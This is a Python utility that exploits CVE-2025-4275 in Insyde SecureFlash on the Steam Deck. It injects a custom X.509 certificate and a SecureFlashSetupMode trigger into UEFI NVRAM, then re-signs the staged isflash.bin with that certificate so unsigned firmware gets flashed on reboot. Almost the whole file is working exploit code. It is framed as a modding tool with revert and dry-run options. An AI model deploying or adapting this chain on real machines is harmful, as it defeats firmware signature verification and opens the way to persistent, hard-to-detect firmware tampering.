#!/usr/bin/env python3
"""
SecureFlash Re-sign Utility
============================
Re-signs isflash.bin on the ESP with a custom certificate and injects
SecureFlash NVRAM variables (CVE-2025-4275) to complete the three-step
chain required for custom firmware flashing.

The three steps (based on Hydroph0bia PoC):
  1. Inject custom cert into SecureFlashCertData (non-volatile NVRAM)
  2. Set SecureFlashSetupMode=1 (non-volatile NVRAM trigger)
  3. Re-sign isflash.bin with the same custom cert

Run AFTER h2offt has staged firmware, BEFORE rebooting.

Usage:
  # Stage firmware with h2offt first:
  sudo /usr/share/jupiter_bios_updater/h2offt firmware.fd -all

  # Then re-sign isflash.bin and inject NVRAM variables:
  sudo python3 secureflash_resign.py --key signing_key.pem

  # To revert (remove NVRAM variables):
  sudo python3 secureflash_resign.py --revert

Requires: Python 3.8+, cryptography library (pip install cryptography)
Must be run as root on the Steam Deck (SteamOS Desktop Mode).

Reference:
  CVE-2025-4275 — https://www.kb.cert.org/vuls/id/211341
  SD-APCB-Tool  — https://github.com/djanice1980/SD-APCB-Tool
"""

import argparse
import datetime
import hashlib
import os
import shutil
import struct
import subprocess
import sys


# ============================================================================
# Constants
# ============================================================================

SCRIPT_VERSION = "1.0.0"

# SecureFlash NVRAM variable GUID (from Hydroph0bia PoC)
SECUREFLASH_GUID = "382af2bb-ffff-abcd-aaee-cce099338877"

CERT_VAR_NAME = "SecureFlashCertData"
MODE_VAR_NAME = "SecureFlashSetupMode"

EFIVARFS_PATH = "/sys/firmware/efi/efivars"
CERT_VAR_PATH = f"{EFIVARFS_PATH}/{CERT_VAR_NAME}-{SECUREFLASH_GUID}"
MODE_VAR_PATH = f"{EFIVARFS_PATH}/{MODE_VAR_NAME}-{SECUREFLASH_GUID}"

# UEFI variable attributes: NV|BS|RT (non-volatile, boot service, runtime access)
NV_BS_RT_ATTRS = struct.pack('<I', 0x00000007)

# EFI_CERT_X509_GUID for EFI_SIGNATURE_LIST
EFI_CERT_X509_GUID = bytes([
    0xa1, 0x59, 0xc0, 0xa5, 0xe4, 0x94, 0xa7, 0x4a,
    0x87, 0xb5, 0xab, 0x15, 0x5c, 0x2b, 0xf0, 0x72
])

# SD-APCB-Tool signer GUID (owner identifier in ESL)
SD_APCB_OWNER_GUID = bytes([
    0x50, 0x41, 0x44, 0x53, 0x42, 0x43, 0x4f, 0x54,
    0x4f, 0x4c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01
])

# Known ESP mount points on SteamOS and other Linux distros
ESP_MOUNT_CANDIDATES = [
    "/esp",
    "/boot/efi",
    "/efi",
    "/boot",
]

# isflash.bin path relative to ESP root
ISFLASH_REL_PATH = "EFI/Insyde/isflash.bin"


# ============================================================================
# Output helpers
# ============================================================================

def _status(tag: str, msg: str):
    colors = {"OK": "\033[92m", "FAIL": "\033[91m", "WARN": "\033[93m",
              "INFO": "\033[96m", "SKIP": "\033[90m", "STEP": "\033[95m"}
    c = colors.get(tag, "")
    print(f"  [{c}{tag:4s}\033[0m] {msg}")


def _abort(msg: str):
    _status("FAIL", msg)
    sys.exit(1)


# ============================================================================
# DER / ASN.1 encoding helpers (pure Python, from sd_apcb_tool.py)
# ============================================================================

def _der_length(length):
    if length < 0x80:
        return bytes([length])
    encoded = length.to_bytes((length.bit_length() + 7) // 8, 'big')
    return bytes([0x80 | len(encoded)]) + encoded


def _der_tag(tag, content):
    return bytes([tag]) + _der_length(len(content)) + content


def _der_sequence(content):
    return _der_tag(0x30, content)


def _der_set(content):
    return _der_tag(0x31, content)


def _der_oid(oid_str):
    parts = [int(x) for x in oid_str.split('.')]
    encoded = bytes([40 * parts[0] + parts[1]])
    for val in parts[2:]:
        if val < 128:
            encoded += bytes([val])
        else:
            octets = []
            while val > 0:
                octets.append(val & 0x7F)
                val >>= 7
            for i in range(len(octets) - 1, 0, -1):
                encoded += bytes([octets[i] | 0x80])
            encoded += bytes([octets[0]])
    return _der_tag(0x06, encoded)


def _der_integer(value):
    if isinstance(value, int):
        if value == 0:
            return _der_tag(0x02, b'\x00')
        byte_len = (value.bit_length() + 8) // 8
        b = value.to_bytes(byte_len, 'big')
        if b[0] & 0x80:
            b = b'\x00' + b
        return _der_tag(0x02, b)
    return _der_tag(0x02, value)


def _der_octet_string(data):
    return _der_tag(0x04, data)


def _der_null():
    return b'\x05\x00'


def _der_context(tag_num, content, constructed=True):
    tag_byte = 0xA0 | tag_num if constructed else 0x80 | tag_num
    return bytes([tag_byte]) + _der_length(len(content)) + content


def _der_utctime(dt):
    s = dt.strftime('%y%m%d%H%M%SZ').encode()
    return _der_tag(0x17, s)


# ============================================================================
# ESL (EFI_SIGNATURE_LIST) builder
# ============================================================================

def build_esl(cert_der: bytes) -> bytes:
    """Build EFI_SIGNATURE_LIST containing one X.509 certificate.

    Returns bytes with 4-byte efivarfs attribute prefix + ESL data.
    """
    sig_data = SD_APCB_OWNER_GUID + cert_der
    sig_size = 16 + len(cert_der)
    header_size = 16 + 4 + 4 + 4   # SignatureType + ListSize + HeaderSize + SigSize
    list_size = header_size + sig_size
    esl = (
        EFI_CERT_X509_GUID +
        struct.pack('<I', list_size) +
        struct.pack('<I', 0) +
        struct.pack('<I', sig_size) +
        sig_data
    )
    return NV_BS_RT_ATTRS + esl


# ============================================================================
# PE Authenticode signing (simplified — no _IFLASH handling)
# ============================================================================

def _compute_pe_checksum(data):
    """Compute PE checksum per Windows MapFileAndCheckSum algorithm."""
    checksum = 0
    pe_off = struct.unpack_from('<I', data, 0x3C)[0]
    cksum_off = pe_off + 4 + 20 + 64
    for i in range(0, len(data) - 1, 2):
        if i == cksum_off or i == cksum_off + 2:
            continue
        val = data[i] | (data[i + 1] << 8)
        checksum += val
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    if len(data) % 2:
        checksum += data[-1]
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    checksum = (checksum & 0xFFFF) + (checksum >> 16)
    checksum += len(data)
    return checksum & 0xFFFFFFFF


def _compute_authenticode_hash(data):
    """Compute PE Authenticode hash per Microsoft specification."""
    pe_off = struct.unpack_from('<I', data, 0x3C)[0]
    opt_start = pe_off + 4 + 20
    magic = struct.unpack_from('<H', data, opt_start)[0]
    cksum_off = opt_start + 64
    dd_start = opt_start + (112 if magic == 0x20B else 96)
    secdir_off = dd_start + 32
    num_dd = struct.unpack_from('<I', data, dd_start - 4)[0] if magic == 0x20B else \
             struct.unpack_from('<I', data, opt_start + 92)[0]
    header_size = struct.unpack_from('<I', data, opt_start + 60 if magic == 0x20B else opt_start + 44)[0]

    h = hashlib.sha256()
    # Hash up to checksum
    h.update(data[:cksum_off])
    # Skip checksum (4 bytes)
    after_cksum = cksum_off + 4
    # Hash from after checksum to security directory
    h.update(data[after_cksum:secdir_off])
    # Skip security directory entry (8 bytes)
    after_secdir = secdir_off + 8
    # Hash rest of header
    h.update(data[after_secdir:header_size])
    # Hash sections in file order
    num_sections = struct.unpack_from('<H', data, pe_off + 6)[0]
    opt_size = struct.unpack_from('<H', data, pe_off + 20)[0]
    section_start = opt_start + opt_size
    sections = []
    for i in range(num_sections):
        off = section_start + i * 40
        raw_ptr = struct.unpack_from('<I', data, off + 20)[0]
        raw_size = struct.unpack_from('<I', data, off + 16)[0]
        if raw_size > 0 and raw_ptr > 0:
            sections.append((raw_ptr, raw_size))
    sections.sort()
    for ptr, size in sections:
        end = min(ptr + size, len(data))
        h.update(data[ptr:end])
    # Hash trailing data (excluding cert table)
    sec_va = struct.unpack_from('<I', data, secdir_off)[0]
    sec_sz = struct.unpack_from('<I', data, secdir_off + 4)[0]
    if sections:
        last_ptr, last_size = sections[-1]
        after_sections = last_ptr + last_size
    else:
        after_sections = header_size
    cert_end = sec_va + sec_sz if sec_va > 0 else len(data)
    if after_sections < cert_end and after_sections < len(data):
        h.update(data[after_sections:min(cert_end, len(data))])
    return h.digest()


def _build_pkcs7(pe_hash, cert_der, private_key):
    """Build PKCS#7 SignedData structure for PE Authenticode."""
    from cryptography.hazmat.primitives.asymmetric import padding as _padding
    from cryptography.hazmat.primitives import hashes as _hashes

    sha256_oid = _der_oid("2.16.840.1.101.3.4.2.1")
    rsa_oid = _der_oid("1.2.840.113549.1.1.1")
    sha256rsa_oid = _der_oid("1.2.840.113549.1.1.11")
    content_type_oid = _der_oid("1.2.840.113549.1.9.3")
    message_digest_oid = _der_oid("1.2.840.113549.1.9.4")
    spc_indirect_oid = _der_oid("1.3.6.1.4.1.311.2.1.4")
    spc_pe_image_oid = _der_oid("1.3.6.1.4.1.311.2.1.15")
    signed_data_oid = _der_oid("1.2.840.113549.1.7.2")
    opus_oid = _der_oid("1.3.6.1.4.1.311.2.1.12")

    # SPC_INDIRECT_DATA_CONTENT
    pe_image_data = _der_sequence(spc_pe_image_oid + _der_sequence(
        _der_tag(0x03, b'\x00') + _der_context(0, _der_context(2, b'', False), True)
    ))
    digest_info = _der_sequence(_der_sequence(sha256_oid + _der_null()) + _der_octet_string(pe_hash))
    spc_content = _der_sequence(pe_image_data + digest_info)

    # Authenticated attributes
    now = datetime.datetime.now(datetime.timezone.utc)
    opus_attr = _der_sequence(opus_oid + _der_set(_der_sequence(b'')))
    ct_attr = _der_sequence(content_type_oid + _der_set(spc_indirect_oid))
    md_attr = _der_sequence(message_digest_oid + _der_set(
        _der_octet_string(hashlib.sha256(spc_content).digest())
    ))
    auth_attrs = opus_attr + ct_attr + md_attr
    auth_attrs_set = _der_context(0, auth_attrs, True)

    # Sign the authenticated attributes
    auth_attrs_for_sign = _der_set(auth_attrs)
    signature = private_key.sign(auth_attrs_for_sign, _padding.PKCS1v15(), _hashes.SHA256())

    # Extract issuer and serial from cert
    from cryptography.x509 import load_der_x509_certificate
    cert_obj = load_der_x509_certificate(cert_der)
    issuer_der = cert_obj.issuer.public_bytes()
    serial_der = _der_integer(cert_obj.serial_number)

    # Signer info
    signer_info = _der_sequence(
        _der_integer(1) +
        _der_sequence(issuer_der + serial_der) +
        _der_sequence(sha256_oid + _der_null()) +
        auth_attrs_set +
        _der_sequence(rsa_oid + _der_null()) +
        _der_octet_string(signature)
    )

    # SignedData
    signed_data = _der_sequence(
        _der_integer(1) +
        _der_set(_der_sequence(sha256_oid + _der_null())) +
        _der_sequence(spc_indirect_oid + _der_context(0, spc_content, True)) +
        _der_context(0, cert_der, True) +
        _der_set(signer_info)
    )

    return _der_sequence(signed_data_oid + _der_context(0, signed_data, True))


def _build_win_certificate(pkcs7_data):
    """Build WIN_CERTIFICATE_PKCS_SIGNED_DATA structure (8-byte aligned)."""
    # WIN_CERTIFICATE header: dwLength(4) + wRevision(2) + wCertType(2)
    body_len = 8 + len(pkcs7_data)
    aligned = (body_len + 7) & ~7
    pad = aligned - body_len
    return struct.pack('<IHH', aligned, 0x0200, 0x0002) + pkcs7_data + b'\x00' * pad


def sign_pe(data_in: bytes, private_key, cert_der: bytes) -> bytes:
    """Sign a PE file with PE Authenticode (no _IFLASH handling).

    This is a simplified version for isflash.bin which is a standard
    UEFI application without Insyde _IFLASH structures.
    """
    data = bytearray(data_in)

    if data[:2] != b'MZ':
        raise ValueError("Not a valid PE file (no MZ header)")
    pe_offset = struct.unpack_from('<I', data, 0x3C)[0]
    if data[pe_offset:pe_offset+4] != b'PE\x00\x00':
        raise ValueError("Invalid PE signature")

    opt_start = pe_offset + 4 + 20
    magic = struct.unpack_from('<H', data, opt_start)[0]
    checksum_offset = opt_start + 64
    dd_start = opt_start + (112 if magic == 0x20B else 96)
    secdir_offset = dd_start + 32

    # Strip existing PE Authenticode signature
    old_va = struct.unpack_from('<I', data, secdir_offset)[0]
    old_sz = struct.unpack_from('<I', data, secdir_offset + 4)[0]
    if old_va > 0 and old_va < len(data):
        data = data[:old_va]

    # Clear fields for hash computation
    struct.pack_into('<I', data, secdir_offset, 0)
    struct.pack_into('<I', data, secdir_offset + 4, 0)
    struct.pack_into('<I', data, checksum_offset, 0)

    # Compute Authenticode hash
    pe_hash = _compute_authenticode_hash(bytes(data))

    # Build PKCS#7 and WIN_CERTIFICATE
    pkcs7 = _build_pkcs7(pe_hash, cert_der, private_key)
    win_cert = _build_win_certificate(pkcs7)

    # Append certificate
    cert_offset = len(data)
    struct.pack_into('<I', data, secdir_offset, cert_offset)
    struct.pack_into('<I', data, secdir_offset + 4, len(win_cert))
    data.extend(win_cert)

    # Compute and write PE checksum
    checksum = _compute_pe_checksum(bytes(data))
    struct.pack_into('<I', data, checksum_offset, checksum)

    # Self-check
    verify_data = bytearray(data[:cert_offset])
    struct.pack_into('<I', verify_data, secdir_offset, 0)
    struct.pack_into('<I', verify_data, secdir_offset + 4, 0)
    struct.pack_into('<I', verify_data, checksum_offset, 0)
    verify_hash = _compute_authenticode_hash(bytes(verify_data))
    if verify_hash != pe_hash:
        raise RuntimeError(f"Self-check FAILED: hash mismatch")

    return bytes(data)


# ============================================================================
# ESP / isflash.bin discovery
# ============================================================================

def find_esp_mount() -> str:
    """Find the EFI System Partition mount point."""
    for path in ESP_MOUNT_CANDIDATES:
        efi_dir = os.path.join(path, "EFI")
        if os.path.isdir(efi_dir):
            return path
    # Try reading /etc/fstab or /proc/mounts
    try:
        with open('/proc/mounts', 'r') as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 3 and parts[2] == 'vfat':
                    efi_dir = os.path.join(parts[1], "EFI")
                    if os.path.isdir(efi_dir):
                        return parts[1]
    except (FileNotFoundError, PermissionError):
        pass
    return None


def find_isflash(esp_mount: str) -> str:
    """Find isflash.bin on the ESP."""
    path = os.path.join(esp_mount, ISFLASH_REL_PATH)
    if os.path.isfile(path):
        return path
    # Case-insensitive search
    insyde_dir = os.path.join(esp_mount, "EFI", "Insyde")
    if not os.path.isdir(insyde_dir):
        # Try case variations
        efi_dir = os.path.join(esp_mount, "EFI")
        if os.path.isdir(efi_dir):
            for name in os.listdir(efi_dir):
                if name.lower() == "insyde":
                    insyde_dir = os.path.join(efi_dir, name)
                    break
    if os.path.isdir(insyde_dir):
        for name in os.listdir(insyde_dir):
            if name.lower() == "isflash.bin":
                return os.path.join(insyde_dir, name)
    return None


# ============================================================================
# NVRAM operations
# ============================================================================

def _read_efivar(path: str):
    """Read a UEFI variable from efivarfs. Returns (attrs, data) or (None, None)."""
    try:
        with open(path, 'rb') as f:
            raw = f.read()
        if len(raw) < 4:
            return None, None
        attrs = struct.unpack_from('<I', raw, 0)[0]
        return attrs, raw[4:]
    except (FileNotFoundError, PermissionError, OSError):
        return None, None


def _remove_efivar(path: str, name: str) -> bool:
    """Remove a single efivar. Returns True on success."""
    if not os.path.exists(path):
        return True
    try:
        subprocess.run(['chattr', '-i', path], capture_output=True, timeout=10)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    try:
        os.unlink(path)
        return True
    except OSError as e:
        _status("FAIL", f"Could not remove {name}: {e}")
        _status("INFO", f"Try: sudo chattr -i {path} && sudo rm {path}")
        return False


def inject_nvram(esl_blob: bytes):
    """Write SecureFlashCertData and SecureFlashSetupMode to NVRAM."""
    # Write SecureFlashCertData
    try:
        with open(CERT_VAR_PATH, 'wb') as f:
            f.write(esl_blob)
    except PermissionError:
        _abort("Permission denied writing to NVRAM.\n"
               "         Device may be patched against CVE-2025-4275.\n"
               "         Use a SPI programmer instead.")
    except OSError as e:
        if e.errno == 1:
            _abort("NVRAM write blocked (EPERM). Firmware has been patched.\n"
                   "         CVE-2025-4275 is no longer exploitable.\n"
                   "         Use a SPI programmer instead.")
        _abort(f"NVRAM write failed: {e}")

    attrs, data = _read_efivar(CERT_VAR_PATH)
    if attrs is None:
        _abort("Certificate injection failed — could not read back variable.")
    _status("OK", "SecureFlashCertData injected into NVRAM.")

    # Set SecureFlashSetupMode trigger
    mode_blob = NV_BS_RT_ATTRS + b'\x01'
    try:
        with open(MODE_VAR_PATH, 'wb') as f:
            f.write(mode_blob)
    except OSError as e:
        _status("WARN", f"Could not set SecureFlashSetupMode: {e}")
        return

    attrs, data = _read_efivar(MODE_VAR_PATH)
    if attrs is not None and len(data) >= 1 and data[0] == 1:
        _status("OK", "SecureFlashSetupMode trigger set (value=1).")
    else:
        _status("WARN", "SecureFlashSetupMode may not have persisted.")


def revert_nvram():
    """Remove SecureFlash NVRAM variables."""
    has_cert = os.path.exists(CERT_VAR_PATH)
    has_mode = os.path.exists(MODE_VAR_PATH)
    if not has_cert and not has_mode:
        _status("SKIP", "No SecureFlash variables found in NVRAM.")
        return True
    success = True
    if has_cert:
        if _remove_efivar(CERT_VAR_PATH, "SecureFlashCertData"):
            _status("OK", "SecureFlashCertData removed.")
        else:
            success = False
    if has_mode:
        if _remove_efivar(MODE_VAR_PATH, "SecureFlashSetupMode"):
            _status("OK", "SecureFlashSetupMode removed.")
        else:
            success = False
    return success


# ============================================================================
# Main
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Re-sign isflash.bin and inject SecureFlash NVRAM variables",
        epilog="Run AFTER h2offt staging, BEFORE rebooting.")
    parser.add_argument('--key', metavar='KEY_PEM',
                        help='Path to RSA private key PEM file (from sd_apcb_tool.py --sign)')
    parser.add_argument('--cert', metavar='CERT_DER',
                        help='Path to X.509 certificate DER file (auto-detected if omitted)')
    parser.add_argument('--revert', action='store_true',
                        help='Remove SecureFlash NVRAM variables and exit')
    parser.add_argument('--esp', metavar='MOUNT',
                        help='ESP mount point (auto-detected if omitted)')
    parser.add_argument('--dry-run', action='store_true',
                        help='Show what would be done without making changes')
    args = parser.parse_args()

    print(f"\n  SecureFlash Re-sign Utility v{SCRIPT_VERSION}")
    print(f"  {'=' * 42}\n")

    # Revert mode
    if args.revert:
        _status("STEP", "Reverting SecureFlash NVRAM variables...")
        if revert_nvram():
            _status("OK", "Revert complete. Safe to reboot normally.")
        else:
            _status("WARN", "Some variables could not be removed.")
        return

    # Check requirements
    if os.geteuid() != 0:
        _abort("This script must be run as root (sudo).")

    if not os.path.isdir(EFIVARFS_PATH):
        _abort(f"efivarfs not found at {EFIVARFS_PATH}.\n"
               "         Is this a UEFI system?")

    if not args.key:
        _abort("--key is required. Provide the signing_key.pem generated\n"
               "         by sd_apcb_tool.py --sign.")

    if not os.path.isfile(args.key):
        _abort(f"Key file not found: {args.key}")

    # Load key and cert
    _status("STEP", "Loading signing key...")
    try:
        from cryptography.hazmat.primitives.serialization import load_pem_private_key
        from cryptography.hazmat.primitives import hashes as _hashes
        from cryptography.x509 import CertificateBuilder, Name, NameAttribute, NameOID
        from cryptography import x509 as _x509
        from cryptography.hazmat.primitives.serialization import Encoding
    except ImportError:
        _abort("cryptography library not installed.\n"
               "         Install with: pip install cryptography")

    with open(args.key, 'rb') as f:
        key_pem = f.read()
    private_key = load_pem_private_key(key_pem, password=None)

    # Load or find cert
    cert_der = None
    if args.cert:
        with open(args.cert, 'rb') as f:
            cert_der = f.read()
    else:
        # Try to find cert alongside key
        key_dir = os.path.dirname(args.key) or '.'
        for name in ['signing_cert.der', 'signing_cert.pem']:
            cp = os.path.join(key_dir, name)
            if os.path.isfile(cp):
                with open(cp, 'rb') as f:
                    cert_data = f.read()
                if name.endswith('.der'):
                    cert_der = cert_data
                else:
                    # PEM → DER
                    cert_obj = _x509.load_pem_x509_certificate(cert_data)
                    cert_der = cert_obj.public_bytes(Encoding.DER)
                _status("OK", f"Found certificate: {cp}")
                break

    if cert_der is None:
        # Generate cert from key
        _status("INFO", "No certificate found, generating from key...")
        now = datetime.datetime.now(datetime.timezone.utc)
        subject = issuer = Name([NameAttribute(NameOID.COMMON_NAME, "SD APCB Tool")])
        cert = (CertificateBuilder()
            .subject_name(subject).issuer_name(issuer)
            .public_key(private_key.public_key())
            .serial_number(_x509.random_serial_number())
            .not_valid_before(now)
            .not_valid_after(now + datetime.timedelta(days=3650))
            .sign(private_key, _hashes.SHA256()))
        cert_der = cert.public_bytes(Encoding.DER)
        _status("OK", "Certificate generated.")

    _status("OK", f"Key loaded: RSA-{private_key.key_size}")

    # Find ESP
    _status("STEP", "Locating ESP and isflash.bin...")
    esp_mount = args.esp or find_esp_mount()
    if not esp_mount:
        _abort("Could not find ESP mount point.\n"
               "         Specify with --esp /path/to/esp")

    _status("OK", f"ESP found: {esp_mount}")

    # Find isflash.bin
    isflash_path = find_isflash(esp_mount)
    if not isflash_path:
        _abort(f"isflash.bin not found on ESP.\n"
               "         Has h2offt staged the firmware? Run h2offt first:\n"
               "           sudo /usr/share/jupiter_bios_updater/h2offt firmware.fd -all")

    _status("OK", f"isflash.bin found: {isflash_path}")

    # Read isflash.bin
    with open(isflash_path, 'rb') as f:
        isflash_data = f.read()

    _status("INFO", f"isflash.bin size: {len(isflash_data):,} bytes")

    # Verify it's a PE file
    if isflash_data[:2] != b'MZ':
        _abort("isflash.bin is not a valid PE file.")

    # Check if already signed with our cert
    pe_off = struct.unpack_from('<I', isflash_data, 0x3C)[0]
    opt_start = pe_off + 4 + 20
    magic = struct.unpack_from('<H', isflash_data, opt_start)[0]
    dd_start = opt_start + (112 if magic == 0x20B else 96)
    secdir_off = dd_start + 32
    old_sec_va = struct.unpack_from('<I', isflash_data, secdir_off)[0]
    old_sec_sz = struct.unpack_from('<I', isflash_data, secdir_off + 4)[0]

    if old_sec_va > 0:
        _status("INFO", f"Existing PE signature at 0x{old_sec_va:X} ({old_sec_sz} bytes)")
    else:
        _status("INFO", "No existing PE signature found.")

    if args.dry_run:
        _status("INFO", "Dry run — would re-sign isflash.bin and inject NVRAM.")
        return

    # Back up original isflash.bin
    backup_path = isflash_path + ".orig"
    if not os.path.exists(backup_path):
        shutil.copy2(isflash_path, backup_path)
        _status("OK", f"Backup saved: {backup_path}")
    else:
        _status("SKIP", f"Backup already exists: {backup_path}")

    # Re-sign isflash.bin
    _status("STEP", "Re-signing isflash.bin with custom certificate...")
    try:
        signed_isflash = sign_pe(isflash_data, private_key, cert_der)
    except Exception as e:
        _abort(f"Failed to sign isflash.bin: {e}")

    _status("OK", f"isflash.bin signed ({len(signed_isflash):,} bytes)")

    # Write re-signed isflash.bin
    with open(isflash_path, 'wb') as f:
        f.write(signed_isflash)
    _status("OK", f"Re-signed isflash.bin written to {isflash_path}")

    # Inject NVRAM variables
    _status("STEP", "Injecting SecureFlash NVRAM variables...")
    esl_blob = build_esl(cert_der)
    inject_nvram(esl_blob)

    # Summary
    print()
    _status("OK", "All three steps complete:")
    print("         1. SecureFlashCertData → custom cert injected")
    print("         2. SecureFlashSetupMode → trigger set")
    print("         3. isflash.bin → re-signed with custom cert")
    print()
    _status("STEP", "NEXT: Reboot to trigger the firmware flash:")
    print("         sudo reboot")
    print()
    _status("INFO", "If the flash fails (hang at logo), power cycle and run:")
    print(f"         sudo python3 {os.path.basename(__file__)} --revert")
    print()


if __name__ == '__main__':
    main()
